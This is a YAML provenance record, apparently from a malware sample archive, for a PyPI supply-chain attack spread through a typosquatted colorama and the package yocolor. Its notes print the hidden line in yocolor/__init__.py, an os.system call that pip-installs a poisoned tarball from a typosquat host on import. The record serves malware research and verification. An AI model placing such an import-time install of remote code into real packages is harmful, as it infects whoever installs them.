schema_version: 1
interpretation:
  - >-
    Two distribution paths carried this attack. One was the edited requirements.txt in
    top-gg/python-sdk, pointing pip at colorama tarballs on files.pythanhosted.org and
    files.pypihosted.org. The other was the PyPI package yocolor, which pulled the same poisoned
    colorama on import.
  - >-
    The typosquatted mirrors are gone and were never archived: the Internet Archive holds one
    capture of a files.pypihosted.org colorama path and it is a 404, and no configured hash provider
    holds any of the three reported colorama digests. The malicious commit is also gone from
    top-gg/python-sdk, whose requirements.txt history skips from 2021 to 2025.
  - >-
    yocolor survives in a public research corpus, and it is the more useful of the two: it names the
    exact poisoned tarball URL the incident record carries.
samples:
  - artifact_id: yocolor
    phase: during
    classification: carrier
    coordinate: pkg:pypi/yocolor@0.4.6
    version: 0.4.6
    filename: yocolor-0.4.6.tar.gz
    path: yocolor/during/yocolor-0.4.6.tar.gz
    sha256: 7e04cda1f7e5936bfe71cd5605cba284819ece4afff9a4ec8a57bc82d0b6bdab
    size: 23038
    source:
      url: >-
        https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/a67fe59149ceeae5cfae301f33d2ce6bd12005d1/yocolor/0.4.6/yocolor-0.4.6.tar.gz
      original_url: https://pypi.org/project/yocolor/
      retrieved_at: '2026-09-02T13:34:00Z'
      kind: research_corpus
    verification:
      status: probable_exact
      basis:
        - git_object_id_verified
        - measured_sha256
      evidence:
        - immutable_git_revision
        - contents_match_checkmarx_description
        - measured_sha256
    notes:
      - >-
        A copy of colorama renamed to yocolor. The last line of yocolor/__init__.py is
        os.system(f"{sys.executable} -m pip install https://files.pypihosted.org/packages/d8/53/
        6f443c9a4a8358a93a6792e2acffb9d9d5cb0a5cfd8802644b7b1c9a02e4/colorama-0.4.6.tar.gz"), which
        is exactly the URL the incident record lists as a distribution location.
      - >-
        setup.py also pip-installs fernet at build time, matching Checkmarx's account of a later
        stage that decrypts hard-coded data with that library.
      - >-
        PyPI removed the project, so this is a retained research copy rather than the registry file.
        No authoritative digest for the release survives to bind it, which is why it is
        probable_exact rather than exact.
    subject: yocolor
